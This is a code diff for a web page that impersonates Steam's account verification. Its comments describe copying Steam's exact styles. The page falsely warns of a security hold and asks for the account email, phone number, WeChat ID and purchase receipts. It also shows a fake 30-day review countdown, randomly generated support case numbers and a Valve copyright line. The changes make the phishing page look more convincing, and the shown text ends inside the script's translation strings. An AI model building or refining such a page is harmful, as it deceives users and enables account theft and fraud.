@@ -5,264 +5,298 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Steam Account Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
+        /* Точные стили Steam */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Motiva Sans", "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
         }
 
         :root {
-            --steam-blue: #171a21;
-            --steam-dark: #0e141b;
-            --steam-light: #1b2838;
+            --steam-dark: #171a21;
+            --steam-darker: #0e141b;
+            --steam-blue: #1b2838;
+            --steam-light-blue: #2a475e;
             --steam-accent: #66c0f4;
             --steam-green: #5c7e10;
+            --steam-yellow: #ffb820;
+            --steam-red: #ff3c3c;
             --steam-text: #c6d4df;
-            --steam-border: #2a475e;
+            --steam-text-light: #ffffff;
+            --steam-text-dark: #8f98a0;
             --steam-button: #4f6d8f;
             --steam-button-hover: #56779c;
+            --steam-border: #2a475e;
+            --steam-input-bg: rgba(0, 0, 0, 0.2);
         }
 
         body {
-            background: linear-gradient(135deg, var(--steam-dark) 0%, var(--steam-blue) 100%);
+            background: linear-gradient(135deg, #000000 0%, var(--steam-darker) 50%, #000000 100%);
+            background-color: var(--steam-darker);
             color: var(--steam-text);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            line-height: 1.6;
+            line-height: 1.4;
+            font-size: 14px;
         }
 
+        /* Точный контейнер Steam */
         .container {
             width: 100%;
-            max-width: 800px;
-            background-color: rgba(23, 26, 33, 0.95);
-            border-radius: 8px;
+            max-width: 940px;
+            background: linear-gradient(180deg, rgba(33, 44, 55, 0.9) 0%, rgba(27, 40, 56, 0.95) 100%);
+            border-radius: 3px;
             overflow: hidden;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
-            border: 1px solid var(--steam-border);
+            box-shadow: 0 0 100px rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(42, 71, 94, 0.5);
         }
 
+        /* Точный хедер Steam */
         .header {
-            background: linear-gradient(90deg, var(--steam-light) 0%, var(--steam-blue) 100%);
-            padding: 25px 30px;
+            background: linear-gradient(90deg, #2b486d 0%, var(--steam-blue) 100%);
+            padding: 20px 30px;
             display: flex;
             align-items: center;
-            border-bottom: 1px solid var(--steam-border);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.2);
+            position: relative;
+            min-height: 60px;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .steam-logo {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 12px;
         }
 
-        .steam-logo i {
-            font-size: 32px;
-            color: var(--steam-text);
+        .steam-logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #2b486d 0%, #66c0f4 100%);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            font-size: 18px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
 
-        .steam-logo h1 {
-            font-size: 24px;
+        .steam-logo-text {
+            font-size: 21px;
             font-weight: 300;
             letter-spacing: 0.5px;
             color: white;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
 
+        .steam-logo-subtext {
+            font-size: 11px;
+            color: var(--steam-accent);
+            margin-top: -3px;
+            font-weight: 400;
+        }
+
+        /* Точный контент Steam */
         .content {
             padding: 30px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4" viewBox="0 0 4 4"><path fill="rgba(255,255,255,0.02)" d="M0 0h2v2H0zM2 2h2v2H2z"/></svg>');
         }
 
+        /* Точный warning box Steam */
         .warning-box {
-            background-color: rgba(90, 50, 40, 0.3);
+            background: linear-gradient(135deg, rgba(90, 50, 40, 0.6) 0%, rgba(70, 40, 30, 0.4) 100%);
             border: 1px solid rgba(255, 100, 100, 0.3);
-            border-radius: 4px;
-            padding: 20px;
-            margin-bottom: 30px;
+            border-radius: 3px;
+            padding: 18px;
+            margin-bottom: 24px;
             display: flex;
             align-items: flex-start;
-            gap: 15px;
+            gap: 14px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .success-box {
-            background-color: rgba(40, 90, 50, 0.3);
-            border: 1px solid rgba(100, 255, 100, 0.3);
-            border-radius: 4px;
-            padding: 20px;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: flex-start;
-            gap: 15px;
+        .warning-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 100, 100, 0.5), transparent);
         }
 
         .warning-icon {
-            color: #ff6b6b;
-            font-size: 24px;
+            color: var(--steam-red);
+            font-size: 20px;
             flex-shrink: 0;
-            margin-top: 2px;
+            margin-top: 1px;
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.5));
+        }
+
+        .warning-text h2 {
+            color: var(--steam-red);
+            font-size: 18px;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        .warning-text p {
+            color: #e6d7d4;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* Точный success box Steam */
+        .success-box {
+            background: linear-gradient(135deg, rgba(40, 90, 50, 0.6) 0%, rgba(30, 70, 40, 0.4) 100%);
+            border: 1px solid rgba(100, 255, 100, 0.3);
+            border-radius: 3px;
+            padding: 18px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .success-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(100, 255, 100, 0.5), transparent);
         }
 
         .success-icon {
             color: #76ffab;
-            font-size: 24px;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .warning-text h2, .success-text h2 {
-            color: #ff6b6b;
             font-size: 20px;
-            margin-bottom: 10px;
-            font-weight: 500;
+            flex-shrink: 0;
+            margin-top: 1px;
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.5));
         }
 
         .success-text h2 {
             color: #76ffab;
+            font-size: 18px;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
 
-        .warning-text p, .success-text p {
-            color: #d6c9c6;
-            font-size: 15px;
+        .success-text p {
+            color: #d4e6d7;
+            font-size: 13px;
+            line-height: 1.5;
         }
 
+        /* Точные секции Steam */
         .info-section {
-            margin-bottom: 30px;
+            margin-bottom: 24px;
         }
 
         .info-section h3 {
             color: var(--steam-accent);
-            font-size: 18px;
-            margin-bottom: 20px;
+            font-size: 16px;
+            margin-bottom: 16px;
             font-weight: 500;
             padding-bottom: 8px;
-            border-bottom: 1px solid var(--steam-border);
-        }
-
-        .timer-section {
-            text-align: center;
-            margin: 30px 0;
-            padding: 25px;
-            background: rgba(16, 21, 28, 0.5);
-            border-radius: 8px;
-            border: 1px solid var(--steam-border);
-        }
-
-        .timer-title {
-            color: var(--steam-accent);
-            font-size: 18px;
-            margin-bottom: 15px;
-            font-weight: 500;
-        }
-
-        .timer-display {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-
-        .timer-unit {
-            background: rgba(23, 26, 33, 0.8);
-            border: 1px solid var(--steam-border);
-            border-radius: 6px;
-            padding: 15px;
-            min-width: 80px;
-        }
-
-        .timer-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--steam-accent);
-            margin-bottom: 5px;
-        }
-
-        .timer-label {
-            font-size: 12px;
-            color: #8f98a0;
+            border-bottom: 1px solid rgba(42, 71, 94, 0.5);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
-        .progress-container {
-            margin-top: 25px;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(42, 71, 94, 0.5);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--steam-accent), #4f6d8f);
-            border-radius: 4px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-
-        .progress-text {
-            font-size: 13px;
-            color: #8f98a0;
-            display: flex;
-            justify-content: space-between;
-        }
-
+        /* Точные формы Steam */
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .form-label {
             display: block;
-            margin-bottom: 8px;
-            color: #8f98a0;
-            font-size: 14px;
+            margin-bottom: 6px;
+            color: var(--steam-text-dark);
+            font-size: 13px;
+            font-weight: 400;
         }
 
         .required::after {
             content: " *";
-            color: #ff6b6b;
+            color: var(--steam-red);
         }
 
         .form-input {
             width: 100%;
-            padding: 12px 15px;
-            background-color: rgba(16, 21, 28, 0.8);
-            border: 1px solid var(--steam-border);
-            border-radius: 4px;
+            padding: 10px 12px;
+            background: var(--steam-input-bg);
+            border: 1px solid rgba(42, 71, 94, 0.8);
+            border-radius: 3px;
             color: var(--steam-text);
-            font-size: 15px;
-            transition: border-color 0.2s;
+            font-size: 13px;
+            transition: all 0.2s ease;
+            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
         }
 
         .form-input:focus {
             outline: none;
             border-color: var(--steam-accent);
+            box-shadow: 0 0 0 2px rgba(102, 192, 244, 0.2);
+            background: rgba(0, 0, 0, 0.3);
         }
 
+        .form-input::placeholder {
+            color: rgba(143, 152, 160, 0.6);
+        }
+
+        /* Точная загрузка файлов Steam */
         .file-upload {
-            margin-top: 10px;
+            margin-top: 8px;
         }
 
         .file-label {
-            display: inline-block;
-            background-color: var(--steam-button);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(180deg, var(--steam-button) 0%, #465d7a 100%);
             color: white;
-            padding: 10px 20px;
-            border-radius: 4px;
+            padding: 8px 16px;
+            border-radius: 2px;
             cursor: pointer;
-            font-size: 14px;
-            transition: background-color 0.2s;
+            font-size: 13px;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.3);
+            font-weight: 500;
         }
 
         .file-label:hover {
-            background-color: var(--steam-button-hover);
+            background: linear-gradient(180deg, var(--steam-button-hover) 0%, #4f6d8f 100%);
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .file-label:active {
+            transform: translateY(1px);
+            background: linear-gradient(180deg, #465d7a 0%, var(--steam-button) 100%);
         }
 
         .file-input {
@@ -270,19 +304,23 @@
         }
 
         .file-list {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #8f98a0;
+            margin-top: 12px;
+            font-size: 12px;
+            color: var(--steam-text-dark);
             max-height: 120px;
             overflow-y: auto;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 3px;
+            padding: 8px;
+            border: 1px solid rgba(42, 71, 94, 0.3);
         }
 
         .file-item {
             display: flex;
             align-items: center;
-            gap: 10px;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(42, 71, 94, 0.3);
+            gap: 8px;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(42, 71, 94, 0.2);
         }
 
         .file-item:last-child {
@@ -291,55 +329,193 @@
 
         .file-icon {
             color: var(--steam-accent);
+            font-size: 11px;
         }
 
         .remove-file {
-            color: #ff6b6b;
+            color: var(--steam-red);
             cursor: pointer;
             margin-left: auto;
-            font-size: 12px;
+            font-size: 11px;
+            opacity: 0.7;
+            transition: opacity 0.2s;
         }
 
+        .remove-file:hover {
+            opacity: 1;
+        }
+
+        /* Точный таймер Steam */
+        .timer-section {
+            text-align: center;
+            margin: 24px 0;
+            padding: 20px;
+            background: rgba(16, 21, 28, 0.4);
+            border-radius: 3px;
+            border: 1px solid rgba(42, 71, 94, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .timer-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(102, 192, 244, 0.3), transparent);
+        }
+
+        .timer-title {
+            color: var(--steam-accent);
+            font-size: 15px;
+            margin-bottom: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .timer-display {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+
+        .timer-unit {
+            background: linear-gradient(180deg, rgba(27, 40, 56, 0.8) 0%, rgba(23, 26, 33, 0.9) 100%);
+            border: 1px solid rgba(42, 71, 94, 0.6);
+            border-radius: 3px;
+            padding: 12px;
+            min-width: 70px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .timer-unit::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(102, 192, 244, 0.3), transparent);
+        }
+
+        .timer-value {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--steam-accent);
+            margin-bottom: 4px;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
+        }
+
+        .timer-label {
+            font-size: 11px;
+            color: var(--steam-text-dark);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .progress-container {
+            margin-top: 20px;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(42, 71, 94, 0.3);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 8px;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--steam-accent), #4f6d8f);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.1);
+        }
+
+        .progress-text {
+            font-size: 12px;
+            color: var(--steam-text-dark);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* Точная кнопка Steam */
         .submit-section {
             display: flex;
             justify-content: center;
-            margin-top: 40px;
+            margin-top: 30px;
         }
 
         .submit-btn {
-            background: linear-gradient(90deg, #4f6d8f 0%, #56779c 100%);
+            background: linear-gradient(180deg, #6fa720 5%, #5c7e10 95%);
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 14px 40px;
-            font-size: 16px;
+            border-radius: 2px;
+            padding: 12px 36px;
+            font-size: 15px;
             font-weight: 500;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.2s ease;
             display: flex;
             align-items: center;
             gap: 10px;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
         }
 
         .submit-btn:hover {
-            background: linear-gradient(90deg, #56779c 0%, #5e82a9 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(180deg, #7bb42a 5%, #6a9120 95%);
+            border-color: rgba(255, 255, 255, 0.1);
         }
 
         .submit-btn:active {
-            transform: translateY(0);
+            background: linear-gradient(180deg, #5c7e10 5%, #6fa720 95%);
+            transform: translateY(1px);
         }
 
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        }
+
+        /* Точный футер Steam */
         .footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid var(--steam-border);
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(42, 71, 94, 0.5);
             text-align: center;
-            color: #8f98a0;
-            font-size: 12px;
+            color: var(--steam-text-dark);
+            font-size: 11px;
+            line-height: 1.4;
         }
 
+        .footer a {
+            color: var(--steam-accent);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Точный селектор языка Steam */
         .language-selector {
             position: absolute;
             top: 20px;
@@ -347,33 +523,58 @@
         }
 
         .lang-btn {
-            background-color: rgba(16, 21, 28, 0.8);
+            background: linear-gradient(180deg, rgba(42, 71, 94, 0.8) 0%, rgba(27, 40, 56, 0.9) 100%);
             color: var(--steam-text);
-            border: 1px solid var(--steam-border);
-            border-radius: 4px;
-            padding: 8px 15px;
+            border: 1px solid rgba(42, 71, 94, 0.8);
+            border-radius: 2px;
+            padding: 6px 12px;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 12px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
+            transition: all 0.2s ease;
         }
 
         .lang-btn:hover {
-            background-color: rgba(26, 31, 38, 0.8);
+            background: linear-gradient(180deg, rgba(51, 82, 108, 0.8) 0%, rgba(36, 50, 68, 0.9) 100%);
+            border-color: rgba(66, 96, 122, 0.8);
         }
 
+        /* Steam notice box */
+        .notice-box {
+            background: rgba(16, 21, 28, 0.4);
+            border: 1px solid rgba(42, 71, 94, 0.4);
+            border-radius: 3px;
+            padding: 16px;
+            margin-top: 20px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: var(--steam-text-dark);
+        }
+
+        .notice-box ul {
+            padding-left: 20px;
+            margin: 8px 0;
+        }
+
+        .notice-box li {
+            margin-bottom: 4px;
+        }
+
+        /* Hidden utility */
         .hidden {
-            display: none;
+            display: none !important;
         }
 
-        @media (max-width: 768px) {
+        /* Responsive для Steam */
+        @media (max-width: 910px) {
             .container {
                 max-width: 100%;
             }
             
             .header {
-                padding: 20px;
+                padding: 16px 20px;
             }
             
             .content {
@@ -384,7 +585,7 @@
                 position: relative;
                 top: 0;
                 right: 0;
-                margin-bottom: 20px;
+                margin-bottom: 16px;
                 display: flex;
                 justify-content: flex-end;
             }
@@ -394,13 +595,37 @@
             }
             
             .timer-unit {
-                min-width: 70px;
-                padding: 12px;
+                min-width: 65px;
+                padding: 10px;
             }
             
             .timer-value {
                 font-size: 24px;
             }
+            
+            .steam-logo-text {
+                font-size: 18px;
+            }
+        }
+
+        /* Scrollbar Steam style */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(42, 71, 94, 0.6);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(51, 82, 108, 0.8);
         }
     </style>
 </head>
@@ -412,117 +637,140 @@
         </button>
     </div>
 
-    <!-- Основная форма (первая страница) -->
+    <!-- Основная форма Steam (первая страница) -->
     <div class="container" id="verificationForm">
         <div class="header">
             <div class="steam-logo">
-                <i class="fab fa-steam"></i>
-                <h1 id="titleText">Steam Account Verification</h1>
+                <div class="steam-logo-icon">S</div>
+                <div>
+                    <div class="steam-logo-text">Steam Account Verification</div>
+                    <div class="steam-logo-subtext" id="headerSubtext">SECURITY CENTER</div>
+                </div>
             </div>
         </div>
 
         <div class="content">
             <div class="warning-box">
                 <div class="warning-icon">
-                    <i class="fas fa-exclamation-triangle"></i>
+                    <i class="fas fa-shield-alt"></i>
                 </div>
                 <div class="warning-text">
-                    <h2 id="warningTitle">Temporary Account Restriction</h2>
+                    <h2 id="warningTitle">Account Security Hold</h2>
                     <p id="warningText">
-                        Your account is temporarily restricted from community visibility for security reasons. 
-                        We detected a login attempt from an unfamiliar IP address, leading to precautionary account suspension. 
-                        To restore full access, please verify your identity by providing the following information.
+                        Your Steam account has been placed under a temporary security hold. We've detected a login attempt from an unfamiliar IP address that does not match your usual location. As a security precaution, community features have been temporarily restricted. To restore full access to your account, please complete the verification process below.
                     </p>
                 </div>
             </div>
 
             <div class="info-section">
-                <h3 id="formTitle">Verification Information</h3>
+                <h3 id="formTitle">ACCOUNT VERIFICATION REQUIRED</h3>
                 
                 <div class="form-group">
-                    <label class="form-label required" id="emailLabel">First email associated with this account</label>
-                    <input type="email" class="form-input" id="emailInput" placeholder="example@email.com" required>
+                    <label class="form-label required" id="emailLabel">Account Email Address</label>
+                    <input type="email" class="form-input" id="emailInput" placeholder="Enter the email associated with your Steam account" required>
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label required" id="phoneLabel">First phone number linked to this account</label>
-                    <input type="tel" class="form-input" id="phoneInput" placeholder="+1 234 567 8900" required>
+                    <label class="form-label required" id="phoneLabel">Phone Number on Account</label>
+                    <input type="tel" class="form-input" id="phoneInput" placeholder="Enter the phone number linked to your Steam account" required>
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label" id="wechatLabel">WeChat ID (if you made purchases via WeChat)</label>
-                    <input type="text" class="form-input" id="wechatInput" placeholder="Optional">
+                    <label class="form-label" id="wechatLabel">WeChat ID (Optional)</label>
+                    <input type="text" class="form-input" id="wechatInput" placeholder="Only if you've made purchases using WeChat">
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label" id="receiptsLabel">Attach purchase receipts (you may attach multiple files)</label>
+                    <label class="form-label" id="receiptsLabel">Purchase Verification</label>
+                    <div class="form-label" style="font-size: 12px; color: var(--steam-text-dark); margin-bottom: 8px;">
+                        To help verify your ownership, please attach recent purchase receipts or transaction confirmations.
+                    </div>
                     <div class="file-upload">
-                        <input type="file" class="file-input" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf,.txt">
+                        <input type="file" class="file-input" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf,.txt,.gif">
                         <label for="fileInput" class="file-label">
                             <i class="fas fa-paperclip"></i>
-                            <span id="chooseFilesText">Choose Files</span>
+                            <span id="chooseFilesText">Attach Files</span>
                         </label>
+                        <span style="margin-left: 10px; font-size: 12px; color: var(--steam-text-dark);">Max 5MB per file</span>
                     </div>
                     <div class="file-list" id="fileList"></div>
                 </div>
             </div>
 
+            <div class="notice-box">
+                <div style="color: var(--steam-accent); margin-bottom: 8px; font-weight: 500;">
+                    <i class="fas fa-info-circle" style="margin-right: 6px;"></i>
+                    <span id="noticeTitle">Important Information</span>
+                </div>
+                <ul id="noticeList">
+                    <li>This verification helps protect your account from unauthorized access</li>
+                    <li>All information is encrypted and processed securely</li>
+                    <li>You will regain full account access upon successful verification</li>
+                    <li>If you don't complete verification, restrictions will remain in place</li>
+                </ul>
+            </div>
+
             <div class="submit-section">
                 <button class="submit-btn" id="submitBtn">
-                    <i class="fas fa-paper-plane"></i>
-                    <span id="submitText">Submit Verification</span>
+                    <i class="fas fa-shield-check"></i>
+                    <span id="submitText">Submit Verification Request</span>
                 </button>
             </div>
 
             <div class="footer">
-                <p id="footerText">Steam &copy; Valve Corporation. All rights reserved.</p>
+                <p id="footerText">
+                    © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
+                    <br>
+                    <span style="font-size: 10px;">Steam Support Case #S-${Math.floor(1000000 + Math.random() * 9000000)}</span>
+                </p>
             </div>
         </div>
     </div>
 
-    <!-- Страница подтверждения (скрыта изначально) -->
+    <!-- Страница подтверждения Steam (скрыта изначально) -->
     <div class="container hidden" id="confirmationPage">
         <div class="header">
             <div class="steam-logo">
-                <i class="fab fa-steam"></i>
-                <h1 id="confirmationTitle">Steam Account Verification</h1>
+                <div class="steam-logo-icon">S</div>
+                <div>
+                    <div class="steam-logo-text" id="confirmationTitle">Verification Status</div>
+                    <div class="steam-logo-subtext" id="confirmationSubtext">CASE UNDER REVIEW</div>
+                </div>
             </div>
         </div>
 
         <div class="content">
             <div class="success-box">
                 <div class="success-icon">
-                    <i class="fas fa-check-circle"></i>
+                    <i class="fas fa-clock"></i>
                 </div>
                 <div class="success-text">
-                    <h2 id="confirmationStatus">Application Under Review</h2>
+                    <h2 id="confirmationStatus">Verification Request Submitted</h2>
                     <p id="confirmationText">
-                        Your application has been accepted for consideration. Please note that the review period may take up to 30 business days. 
-                        Your account will remain blocked while we verify all the data. 
-                        Please note that submitting a new application will not speed up the processing of any application, but will only extend the review period.
+                        Your account verification request has been received and is now in our review queue. The security hold on your account will remain in place while our team verifies your information. Standard review time is up to 30 business days. Please do not submit additional requests as this will delay the process.
                     </p>
                 </div>
             </div>
 
             <div class="timer-section">
-                <div class="timer-title" id="timerTitle">Estimated Review Completion Time</div>
+                <div class="timer-title" id="timerTitle">ESTIMATED REVIEW COMPLETION</div>
                 
                 <div class="timer-display">
                     <div class="timer-unit">
                         <div class="timer-value" id="days">30</div>
-                        <div class="timer-label" id="daysLabel">Days</div>
+                        <div class="timer-label" id="daysLabel">DAYS</div>
                     </div>
                     <div class="timer-unit">
                         <div class="timer-value" id="hours">00</div>
-                        <div class="timer-label" id="hoursLabel">Hours</div>
+                        <div class="timer-label" id="hoursLabel">HOURS</div>
                     </div>
                     <div class="timer-unit">
                         <div class="timer-value" id="minutes">00</div>
-                        <div class="timer-label" id="minutesLabel">Minutes</div>
+                        <div class="timer-label" id="minutesLabel">MINUTES</div>
                     </div>
                     <div class="timer-unit">
                         <div class="timer-value" id="seconds">00</div>
-                        <div class="timer-label" id="secondsLabel">Seconds</div>
+                        <div class="timer-label" id="secondsLabel">SECONDS</div>
                     </div>
                 </div>
 
@@ -531,138 +779,165 @@
                         <div class="progress-fill" id="progressFill"></div>
                     </div>
                     <div class="progress-text">
-                        <span id="progressStart">Submission Time</span>
-                        <span id="progressEnd">30 Days</span>
+                        <span id="progressStart">REQUEST SUBMITTED</span>
+                        <span id="progressEnd">30 DAY REVIEW</span>
                     </div>
                 </div>
             </div>
 
             <div class="info-section">
-                <h3 id="noticeTitle">Important Notice</h3>
-                <p id="noticeText" style="color: #8f98a0; font-size: 14px; line-height: 1.6;">
-                    • Do not submit additional applications - this will reset your position in the queue<br>
-                    • You will receive an email notification when the review is complete<br>
-                    • The timer above shows the maximum estimated time, actual review may be completed earlier<br>
-                    • Your account security is our top priority
-                </p>
+                <h3>REVIEW PROCESS INFORMATION</h3>
+                <div class="notice-box">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px;">
+                        <div>
+                            <div style="color: var(--steam-accent); margin-bottom: 6px; font-weight: 500;">
+                                <i class="fas fa-user-check" style="margin-right: 6px;"></i>
+                                <span>Account Verification</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--steam-text-dark);">
+                                Our security team will verify the information you've provided against your account records.
+                            </div>
+                        </div>
+                        <div>
+                            <div style="color: var(--steam-accent); margin-bottom: 6px; font-weight: 500;">
+                                <i class="fas fa-file-invoice" style="margin-right: 6px;"></i>
+                                <span>Document Review</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--steam-text-dark);">
+                                Any attached receipts or documents will be reviewed for authenticity and account matching.
+                            </div>
+                        </div>
+                        <div>
+                            <div style="color: var(--steam-accent); margin-bottom: 6px; font-weight: 500;">
+                                <i class="fas fa-envelope" style="margin-right: 6px;"></i>
+                                <span>Notification</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--steam-text-dark);">
+                                You'll receive an email notification when the review is complete and your account status is updated.
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
 
             <div class="footer">
-                <p id="confirmationFooter">Steam &copy; Valve Corporation. All rights reserved. Application ID: <span id="applicationId">STEAM-APP-${Math.floor(Math.random() * 1000000)}</span></p>
+                <p id="confirmationFooter">
+                    © Valve Corporation. All rights reserved. All trademarks are property of their respective owners.
+                    <br>
+                    <span style="font-size: 10px;">Support Case: <span id="applicationId">S-${Math.floor(1000000 + Math.random() * 9000000)}</span> | Submitted: <span id="submissionDate">${new Date().toLocaleDateString()}</span></span>
+                </p>
             </div>
         </div>
     </div>
 
     <script>
-        // Language data
+        // Точные переводы Steam
         const translations = {
             en: {
                 // Основная форма
-                title: "Steam Account Verification",
-                warningTitle: "Temporary Account Restriction",
-                warningText: "Your account is temporarily restricted from community visibility for security reasons. We detected a login attempt from an unfamiliar IP address, leading to precautionary account suspension. To restore full access, please verify your identity by providing the following information.",
-                formTitle: "Verification Information",
-                emailLabel: "First email associated with this account",
-                phoneLabel: "First phone number linked to this account",
-                wechatLabel: "WeChat ID (if you made purchases via WeChat)",
-                receiptsLabel: "Attach purchase receipts (you may attach multiple files)",
-                chooseFilesText: "Choose Files",
-                submitText: "Submit Verification",
-                footerText: "Steam &copy; Valve Corporation. All rights reserved.",
+                headerSubtext: "SECURITY CENTER",
+                warningTitle: "Account Security Hold",
+                warningText: "Your Steam account has been placed under a temporary security hold. We've detected a login attempt from an unfamiliar IP address that does not match your usual location. As a security precaution, community features have been temporarily restricted. To restore full access to your account, please complete the verification process below.",
+                formTitle: "ACCOUNT VERIFICATION REQUIRED",
+                emailLabel: "Account Email Address",
+                phoneLabel: "Phone Number on Account",
+                wechatLabel: "WeChat ID (Optional)",
+                receiptsLabel: "Purchase Verification",
+                chooseFilesText: "Attach Files",
+                submitText: "Submit Verification Request",
+                noticeTitle: "Important Information",
+                noticeList: "<li>This verification helps protect your account from unauthorized access</li><li>All information is encrypted and processed securely</li><li>You will regain full account access upon successful verification</li><li>If you don't complete verification, restrictions will remain in place</li>",
                 
                 // Страница подтверждения
-                confirmationTitle: "Steam Account Verification",
-                confirmationStatus: "Application Under Review",
